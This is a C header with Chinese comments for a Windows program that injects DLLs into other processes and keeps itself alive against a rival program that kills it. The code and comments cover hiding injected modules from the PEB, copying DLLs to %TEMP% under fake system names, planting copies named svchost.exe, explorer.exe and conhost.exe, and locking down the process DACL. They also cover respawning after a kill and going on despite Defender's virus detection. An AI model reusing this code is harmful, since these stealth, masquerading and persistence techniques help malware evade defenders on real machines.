        _snwprintf(out, cch - 1, L"%s\\xx_%s%s%s_%lu", ns, purpose,
                   token ? L"_" : L"", hex, (unsigned long)pidOrZero);
    else
        _snwprintf(out, cch - 1, L"%s\\xx_%s%s%s", ns, purpose, token ? L"_" : L"", hex);
    out[cch - 1] = L'\0';
}

/* ================== 全局互斥体（Everyone 可访问） ==================
   为什么需要 SD：xx 以管理员运行（高完整性），它建出来的 Global\ 互斥体默认 DACL
   只给 SYSTEM/Administrators/创建者；中完整性的宿主（explorer 等）打开会 ACCESS_DENIED，
   于是它自己另建一把 Local\ 的锁 —— 冗余就废了。
   这里用 SDDL 显式放开 Everyone（GA），所有会话/完整性级别的实例都能打开同一把锁。
   失败（没有 SeCreateGlobalPrivilege、或名字冲突）就退 Local\，调用方照常工作。 */
static __inline HANDLE XXCreateGlobalMutex(const WCHAR *name) {
    HANDLE h = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;
    SECURITY_ATTRIBUTES sa;

    if (!name || !name[0]) return NULL;
    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(
            XX_GLOBAL_MUTEX_SDDL, SDDL_REVISION_1, &pSD, NULL) && pSD) {
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = pSD;
        sa.bInheritHandle = FALSE;
        h = CreateMutexW(&sa, FALSE, name);
        LocalFree(pSD);
    } else {
        h = CreateMutexW(NULL, FALSE, name);
    }
    if (!h) {
        /* Global\ 建不出来（权限/命名空间）：退到同名 Local\ */
        WCHAR alt[160];
        const WCHAR *leaf = wcsstr(name, L"\\");
        _snwprintf(alt, _countof(alt) - 1, L"Local\\%s", leaf ? leaf + 1 : name);
        alt[_countof(alt) - 1] = L'\0';
        h = CreateMutexW(NULL, FALSE, alt);
    }
    return h;
}
/* 等注入方把 token 送进来（它在 LoadLibrary 返回后立刻远程调用 XxSetNames）。
   各模块 DllMain 里先用这个短等一下，避免"单例用回退名、探针用 token 名"这种错配。 */
static __inline void XXWaitToken(volatile ULONGLONG *pToken, DWORD ms) {
    DWORD waited = 0;
    while (*pToken == 0 && waited < ms) {
        Sleep(10);
        waited += 10;
    }
}

/* ---- 共享内存里的 64 位回退 token（懒读：不依赖调用方是否已经映射过） ---- */
static __inline ULONGLONG XXSharedToken64Now(void) {
    HANDLE h = XXOpenShared();
    ULONGLONG v = 0;
    PVOID view;
    if (!h) return 0;
    view = MapViewOfFile(h, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
    if (view) {
        v = XX_NAME_TOKEN64(view);
        UnmapViewOfFile(view);
    }
    CloseHandle(h);
    return v;
}

/* ================== 判"我方实例是否活着"：只用进程表，不打开进程 ==================
   为什么**不需要句柄**：xx.exe 的进程 DACL 把 Everyone 全拒（连查询都拒），
   `OpenProcess`/`XXPidIsOurXx` 对它必然失败 —— 拿它当判活判据只会永远返回"没有实例",
   于是每一次心跳停摆都白拉一份。判活这件事本来就只需要"有没有这个进程"，
   进程表（`CreateToolhelp32Snapshot`）就够，不需要任何句柄。

   真正需要 xx 句柄的是**宿主里的 `guard.dll`**（判活 + 解挂被挂起的线程），
   它用的是 xx 在收紧 DACL 之前打开、再用 `DuplicateHandle` 交接进宿主的那个句柄
   （见 README 6.1.1）。svcguard 只负责"发现没了就拉起"，不持句柄。

   判据（全部在进程表快照上做）：
     ① 叶子名 `xx.exe`                  → 交付本体；
     ② 三个改名叶子名之一且 PID 等于共享内存 `OFFSET_XX_PID` 记录的实例 PID → 接管副本。
        只按名字认会把系统真正的 `svchost`/`explorer`/`conhost` 当成我们（于是永不复活）；
        用记录的 PID 认，既认得出改名的副本，也不会误认系统进程。
     ③ 其余一律不认。 */
static __inline DWORD XXSharedInstancePid(void) {
    HANDLE h = XXOpenShared();
    DWORD pid = 0;
    PVOID view;

    if (!h) return 0;
    view = MapViewOfFile(h, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
    if (view) {
        if (XX_LAYOUT(view) == XX_LAYOUT_VERSION) pid = XX_XXPID(view);
        UnmapViewOfFile(view);
    }
    CloseHandle(h);
    return pid;
}

/* leaf / pid 直接来自 PROCESSENTRY32W（szExeFile / th32ProcessID）；
   knownPid 传 XXSharedInstancePid() 的结果（拿不到就传 0，此时只认 xx.exe）。 */
static __inline BOOL XXSnapIsOurInstance(LPCWSTR leaf, DWORD pid, DWORD knownPid) {
    if (!leaf || !leaf[0]) return FALSE;
    if (_wcsicmp(leaf, L"xx.exe") == 0) return TRUE;
    if (!XXIsTakeoverLeaf(leaf)) return FALSE;
    return (knownPid != 0 && pid == knownPid) ? TRUE : FALSE;
}

/* ---- 命名对象名的候选列表 ----
   为什么会有多个候选：`XxSetNames` 是"加载完之后"才 push 的，所以
     · 被远程注入的模块 → DllMain 里等到了 token → 用 **token** 名；
     · xx 同进程同步 LoadLibrary 的模块（guard/defense/window/svcguard）→ push 只能发生在
       DllMain 返回之后 → 只能用**回退名**。
   只认一种名字就会互相看不见：注入方以为宿主里没有我们 → 反复重复注入；
   宿主里的单例还会被加载两次。所以统一按"token → 共享 64 位回退 token → 固定值 → 裸名"
   顺序尝试，创建和探测用同一张候选表。回退层也是 64 位随机值，不用写死常量。 */
static __inline int XXNameCandidates(ULONGLONG token, ULONGLONG *out, int max) {
    ULONGLONG s;
    int n = 0;
    if (!out || max <= 0) return 0;

    /* 顺序很重要：**创建**时用第一个候选，所以随机值排在写死常量前面。
       探测则要把所有形态都试一遍，否则"远程注入的那份（token 名）"和
       "同进程同步加载的那份（回退名）"会互相看不见。 */
    if (token && token != XX_NAME_TOKEN_FIXED && n < max) out[n++] = token;
    s = XXSharedToken64Now();
    if (s && n < max && (n == 0 || s != out[0])) out[n++] = s;
    if (n < max) out[n++] = XX_NAME_TOKEN_FIXED;
    if (n < max) out[n++] = 0;
    return n;
}

/* ================== 2. 进程内单例 ==================
   模块被摘出 PEB 后，注入方再也无法用"模块列表"判断宿主里有没有我们，
   会反复重复注入。若不加限制，同一个进程里会叠出多份实例、多套线程。
   这里用 per-process 命名互斥体做单例（名字带会话 token，对手没法预先抢占）：
     返回非 NULL = 本次由我们启动（句柄要一直持有；持有线程死掉后互斥体会变成
     abandoned，下一个被注入的副本就能接管并重启线程 → 线程被杀也能自愈）；
     返回 NULL   = 已经有一份在跑，本次直接 return FALSE 让加载失败（不会残留映射）。
   创建时按候选表逐个试：任一候选已存在且**有人持有** → 说明已有实例，直接拒绝。 */
static __inline HANDLE XXModuleSingleton(const WCHAR *tag, ULONGLONG token) {
    WCHAR name[128];
    ULONGLONG cand[4];
    int n, i;

    n = XXNameCandidates(token, cand, 4);
    for (i = 0; i < n; i++) {
        HANDLE h;
        DWORD created;

        XXNamedObject(name, _countof(name), TRUE, tag, cand[i], GetCurrentProcessId());
        h = CreateMutexW(NULL, TRUE, name);
        created = GetLastError();
        if (!h) {
            XXNamedObject(name, _countof(name), FALSE, tag, cand[i], GetCurrentProcessId());
            h = CreateMutexW(NULL, TRUE, name);
            created = GetLastError();
        }
        if (!h) continue;                         /* 这个名字建不出来，试下一个 */

        if (created == ERROR_ALREADY_EXISTS) {
            DWORD w = WaitForSingleObject(h, 0);
            if (w == WAIT_TIMEOUT) {              /* 有人活着持有 → 已有实例 */
                CloseHandle(h);
                return NULL;
            }
            /* WAIT_OBJECT_0 / WAIT_ABANDONED：前任线程已死，归我们 */
            return h;
        }
        return h;                                 /* 新建成，就用这个名字 */
    }
    return NULL;
}

/* 某个 PID 里是否已经有"我们的"某模块在跑。
   模块已经从 PEB 摘除、名字也被改成随机系统 dll 名 ——
   `CreateToolhelp32Snapshot(SNAPMODULE)` / `EnumProcessModules` 读的就是 PEB 那三条链，
   对我们**永远返回"没有"**，所以绝不能用它们判断。
   这里用单例互斥体做探针（这个名字只有我们建得出来）。
   两种名字都要试：
     · 带 token 的（注入方远程 push 之后创建的那份）；
     · 不带 token 的回退名（**同进程同步 LoadLibrary** 时 push 只能在 DllMain 返回后才发生，
       那份模块的单例必然是回退名）。只认一种就会互相看不见、导致反复重复注入。 */
static __inline BOOL XXModulePresent(DWORD pid, const WCHAR *tag, ULONGLONG token) {
    WCHAR name[128];
    ULONGLONG cand[4];
    int n, i;

    n = XXNameCandidates(token, cand, 4);
    for (i = 0; i < n; i++) {
        HANDLE h;
        XXNamedObject(name, _countof(name), TRUE, tag, cand[i], pid);
        h = OpenMutexW(SYNCHRONIZE, FALSE, name);
        if (!h) {
            XXNamedObject(name, _countof(name), FALSE, tag, cand[i], pid);
            h = OpenMutexW(SYNCHRONIZE, FALSE, name);
        }
        if (h) {
            CloseHandle(h);
            return TRUE;
        }
    }
    return FALSE;
}

/* ================== 3. 注入用临时副本（改名为随机"系统 dll"） ==================
   对手的反注入名单和删文件名单都是按 svcguard.dll / window.dll 这类名字来的。
   注入前把 dll 复制到 %TEMP% 并换成一个像系统组件的随机名字，两个名单同时失效；
   文件被删也会在下次注入前自动重新复制。
   salt 由 xx.exe 生成并写进共享内存，所有实例算出的名字一致 —— 每轮只会有
   固定几份副本，而不是每个宿主各留一份。 */
static __inline BOOL XXMakeTempCopy(LPCWSTR srcPath, DWORD salt, WCHAR *outPath, SIZE_T cch) {
    static const WCHAR *pool[] = {
        L"sechost", L"propsys", L"winmm", L"d3d9", L"msacm32", L"oleacc",
        L"comctl32", L"uxtheme", L"version", L"wintrust", L"bcrypt", L"dwmapi"
    };
    WCHAR tmp[MAX_PATH], leaf[64];
    DWORD h = 2166136261u, mix;
    const WCHAR *p;
    size_t i;

    if (!srcPath || !srcPath[0] || !outPath || cch < 16) return FALSE;
    if (!GetTempPathW(MAX_PATH, tmp)) return FALSE;

    /* 用源文件名做个短哈希，保证不同模块拿到不同的随机名 */
    for (p = srcPath; *p; p++) { h ^= (DWORD)towlower(*p); h *= 16777619u; }
    mix = salt ^ h;

    _snwprintf(leaf, _countof(leaf) - 1, L"%s%04X.dll",
               pool[(mix >> 8) % (sizeof(pool) / sizeof(pool[0]))], (unsigned)(mix & 0xFFFF));
    leaf[_countof(leaf) - 1] = L'\0';

    _snwprintf(outPath, cch - 1, L"%s%s", tmp, leaf);
    outPath[cch - 1] = L'\0';

    for (i = 0; i < 2; i++) {                    /* 不存在或被删 → 重新复制 */
        if (GetFileAttributesW(outPath) != INVALID_FILE_ATTRIBUTES) return TRUE;
        if (CopyFileW(srcPath, outPath, FALSE)) return TRUE;
        Sleep(50);
    }
    return FALSE;
}

/* ---- 取一个全路径的所在目录（带结尾反斜杠） ---- */
static __inline void XXDirNameOf(const WCHAR *full, WCHAR *dir, SIZE_T cch) {
    WCHAR tmp[MAX_PATH];
    WCHAR *p;
    if (!full || !full[0]) { if (cch) dir[0] = L'\0'; return; }
    wcsncpy_s(tmp, MAX_PATH, full, _TRUNCATE);
    p = wcsrchr(tmp, L'\\');
    if (p) p[1] = L'\0'; else tmp[0] = L'\0';
    wcsncpy_s(dir, cch, tmp, _TRUNCATE);
}

/* ---- 程序目录的唯一权威来源 ----
   注入的 dll 是从 %TEMP% 下的随机副本加载的，按"自身模块路径"推目录会推到
   %TEMP%，xx.exe / xxres.bin / 同伴 dll 全部找不到。所以一律优先用 xx.exe
   写进共享内存的自身路径；只有拿不到（无共享内存）时才退回自己的模块路径。 */
static __inline const WCHAR *XXPathBase(void *pSharedView, const WCHAR *fallbackSelfPath) {
    if (pSharedView) {
        const WCHAR *p = XX_XXPATH(pSharedView);
        if (p[0] != L'\0') return p;
    }
    return fallbackSelfPath;
}

/* ================== 复活目标：优先 %TEMP% 下改名的接管副本 ==================
   交付物只有一个 xx.exe，但运行期会额外布置一份改名副本（svchost/explorer/conhost.exe
   在 %TEMP% 下，见 xx.c 的 SpawnTakeoverCopy）。对手 yy 的 HunterWorker 每 50ms
   **按进程名**杀一轮 xx.exe，所以复活链只要还有副本就去拉副本，拉本体等于白送。

   候选次序：
     ① `%TEMP%\svchost.exe` / `explorer.exe` / `conhost.exe` —— 我们布置出去的那三个名字；
        必须通过"看着像我们的可执行文件"校验（PE 头 + 体积），避免拿到同名的残留/占位文件；
     ② 调用方给的交付本体路径（`<程序目录>\xx.exe`，程序目录来自 OFFSET_XX_PATH）。
   两个都没有就返回 FALSE，由调用方决定放弃本次复活。

   ⚠ 注意 OFFSET_XX_PATH 的语义是**程序目录**（只由叶子名 xx.exe 的实例刷新），
   不是"该拉哪个实例"。以前让接管副本改写它，会把程序目录一起改到 %TEMP%，
   副本接管之后所有模块都加载不到 —— 表现就是"复活一次、没有弹窗、之后再杀不复活"。 */
/* ---- "这个文件像不像一份可执行的 xx"（用于复活前筛掉残留/占位/垃圾文件） ----
   判定是**宽容**的：只有"确实读到内容、且明显不是 PE"才返回 FALSE。
   读不到（被别的进程占着、被杀软拦截 —— 实测本机 Defender 对编译出来的 xx.exe
   会直接返回 ERROR_VIRUS_INFECTED(225)）一律算"判不了"，按可用处理，绝不因为
   读不到就把我们自己的副本判死。 */
static __inline BOOL XXExeFilePlausible(LPCWSTR path) {
    HANDLE hf;
    DWORD rd = 0;
    BYTE head[64];
    LONG  lfanew;
    BYTE  sig[4];

    if (!path || !path[0]) return FALSE;
    if (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES) return FALSE;

    hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                     NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return TRUE;        /* 打不开 ≠ 不是我们的文件 */

    if (!ReadFile(hf, head, sizeof(head), &rd, NULL)) { /* 读失败：同样不下结论 */
        CloseHandle(hf);
        return TRUE;
    }
    if (rd < 2 || head[0] != 'M' || head[1] != 'Z') {   /* 读到内容但没有 MZ：不是镜像 */
        CloseHandle(hf);
        return FALSE;
    }
    if (rd < sizeof(head)) {                            /* 有 MZ 却不到 64 字节：截断文件 */
        CloseHandle(hf);
        return FALSE;
    }
    lfanew = *(LONG *)(head + 0x3C);
    if (lfanew <= 0 || lfanew > (1 << 20)) {
        CloseHandle(hf);
        return FALSE;
    }
    if (SetFilePointer(hf, lfanew, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
        !ReadFile(hf, sig, sizeof(sig), &rd, NULL) || rd != sizeof(sig)) {
        CloseHandle(hf);
        return TRUE;                                    /* 定位/读取失败：判不了，放行 */
    }
    CloseHandle(hf);
    return (sig[0] == 'P' && sig[1] == 'E' && sig[2] == 0 && sig[3] == 0) ? TRUE : FALSE;
}

static __inline BOOL XXRespawnTargetPath(void *pSharedView, LPCWSTR fallbackXxPath,
                                         WCHAR *out, SIZE_T cch) {
    static const WCHAR *leaves[] = { L"svchost.exe", L"explorer.exe", L"conhost.exe", NULL };
    WCHAR tmp[MAX_PATH];
    int i;

    (void)pSharedView;          /* 目标选择不再依赖共享内存里的路径记录 */
    if (!out || cch < 8) return FALSE;
    out[0] = L'\0';

    if (GetTempPathW(MAX_PATH, tmp)) {
        for (i = 0; leaves[i]; i++) {
            WCHAR cand[MAX_PATH];
            swprintf_s(cand, MAX_PATH, L"%s%s", tmp, leaves[i]);
            if (GetFileAttributesW(cand) == INVALID_FILE_ATTRIBUTES) continue;
            if (!XXExeFilePlausible(cand)) continue;         /* 残留/占位/垃圾文件：跳过 */
            wcsncpy_s(out, cch, cand, _TRUNCATE);
            return TRUE;
        }
    }
    if (fallbackXxPath && fallbackXxPath[0] &&
        XXPathLooksLikeOurXx(fallbackXxPath) &&
        GetFileAttributesW(fallbackXxPath) != INVALID_FILE_ATTRIBUTES) {
        wcsncpy_s(out, cch, fallbackXxPath, _TRUNCATE);
        return TRUE;
    }
    return FALSE;
}

/* ---- 日志是无锁共享的：读到别人正在搬移的中间状态时必须有界求长度，
       绝不能让 wcslen 越过日志区、跑出 4096 的映射之外 ---- */
static __inline size_t XXLogLen(const WCHAR *p, size_t maxChars) {
    size_t i;
    for (i = 0; i < maxChars; i++)
        if (p[i] == L'\0') return i;
    return maxChars;
}

/* ---- 布局自检：任何一处改坏，直接编不过，而不是运行时互相踩内存 ---- */
#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(OFFSET_HB_SUFFIX + SUFFIX_MAX * 2 <= OFFSET_WND_SUFFIX,
               "hb suffix overlaps window suffix");
_Static_assert(OFFSET_WND_SUFFIX + SUFFIX_MAX * 2 <= OFFSET_HB_TICK,
               "window suffix overlaps heartbeat tick");
_Static_assert(OFFSET_HB_TICK + 4 <= OFFSET_LAYOUT, "hb tick overlaps layout version");
_Static_assert(OFFSET_LAYOUT + 4 <= OFFSET_XX_PID, "layout version overlaps xx pid");
_Static_assert(OFFSET_XX_PID + 4 <= OFFSET_TAG, "xx pid overlaps tag");
_Static_assert(OFFSET_TAG + 4 <= OFFSET_HDL_TABLE, "tag overlaps handle table");
_Static_assert(OFFSET_HDL_TABLE + HDL_TABLE_MAX * HDL_ENTRY_SIZE <= OFFSET_SELF_HANDLE,
               "handle table overlaps self-handle slot");
_Static_assert(OFFSET_XX_SESSION + 4 <= OFFSET_TMP_SALT, "xx session overlaps tmp salt");
_Static_assert(OFFSET_TMP_SALT + 4 <= OFFSET_XX_PATH, "tmp salt overlaps xx path");
_Static_assert(OFFSET_XX_PATH + XX_PATH_MAX * 2 <= OFFSET_OWNER_TABLE, "xx path overlaps owner table");
_Static_assert(OFFSET_OWNER_TABLE + OWNER_SLOTS * OWNER_SLOT_SIZE <= OFFSET_LOG, "owner table overlaps log");
_Static_assert(OFFSET_TAUNT_DONE + 4 <= OFFSET_COUNTER, "taunt fields overlap counter");
_Static_assert(OFFSET_SELF_HANDLE % 8 == 0, "self-handle must stay 8-byte aligned");
_Static_assert(OFFSET_LOG + LOG_SIZE <= OFFSET_COUNTER, "log overlaps counter");
_Static_assert(OFFSET_COUNTER + 4 <= SHARED_MEM_SIZE, "counter outside shared memory");
_Static_assert(OFFSET_HDL_TABLE % 8 == 0 && HDL_ENTRY_SIZE % 8 == 0 && OFFSET_SELF_HANDLE % 8 == 0,
               "handle table entries must stay 8-byte aligned");
#endif

#endif /* XXIPC_H */












